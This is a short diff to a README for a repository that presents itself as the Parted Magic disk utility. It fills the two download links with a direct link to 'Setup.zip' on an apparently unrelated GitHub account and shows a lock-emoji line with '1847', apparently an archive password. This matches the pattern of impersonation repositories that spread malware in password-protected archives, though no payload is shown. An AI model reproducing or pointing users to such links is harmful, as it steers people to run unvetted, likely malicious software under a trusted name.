@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/badgesharksound/Parted-Magic/releases/download/Last/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Parted Magic](https://img.shields.io/badge/Download%20Parted%20Magic-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Parted Magic](https://img.shields.io/badge/Download%20Parted%20Magic-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/badgesharksound/Parted-Magic/releases/download/Last/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
